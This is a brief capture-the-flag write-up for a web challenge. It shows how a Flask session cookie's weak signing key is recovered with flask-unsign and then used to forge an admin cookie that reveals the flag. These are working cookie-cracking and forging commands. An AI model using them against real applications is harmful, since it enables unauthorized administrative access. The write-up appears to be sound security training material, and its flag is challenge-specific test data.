## Solution

Take a look at the cookies, we see one labelled "session".
At first it looks like JWT but when we attempt to decode we get an error.
Use `flask-unsign --unsign --cookie "<cookie here>"` to get the secret key `supersecretkey`.
We can then sign our own cookies as such:
`flask-unsign --sign --cookie "{'username': 'admin'}" --secret 'supersecretkey'`
Changing our cookie and heading to `/admin` we get the flag.\

flag: OSCTF{Av0id_S1mpl3_P4ssw0rDs}